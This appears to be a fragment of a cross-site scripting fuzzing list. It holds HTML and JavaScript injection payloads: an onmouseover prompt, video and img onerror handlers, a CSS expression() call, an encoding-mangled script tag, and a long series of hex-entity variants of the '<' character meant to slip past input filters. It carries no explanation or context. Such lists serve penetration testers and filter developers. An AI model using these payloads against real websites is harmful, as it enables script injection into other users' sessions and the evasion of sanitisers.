<var onmouseover="prompt(1)">On Mouse Over</var>
<video src=1 onerror=alert(1)>
&#x000003c
&#x000003c;
&#x000003C
&#x000003C;
&#X000003c
&#X000003c;
&#X000003C
&#X000003C;
&#x00003c
&#x00003c;
&#x00003C
&#x00003C;
&#X00003c
&#X00003c;
&#X00003C
&#X00003C;
&#x0003c
&#x0003c;
&#x0003C
&#x0003C;
&#X0003c
&#X0003c;
&#X0003C
&#X0003C;
&#x003c
&#x003c;
&#x003C
&#x003C;
&#X003c
&#X003c;
&#X003C
&#X003C;
&#x03c
&#x03c;
&#x03C
&#x03C;
&#X03c
&#X03c;
&#X03C
&#X03C;
&#x3c
&#x3c;
\x3c
&#x3C
&#x3C;
\x3C
&#X3c
&#X3c;
&#X3C
&#X3C;
<xmp><xmp/><img src=url404 onerror=xss(3)>
'';!--"<XSS>=&{()}
xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
<XSS STYLE="xss:expression(alert('XSS'))">
<x" title="/>
žscriptualert(EXSSE)ž/scriptu

```
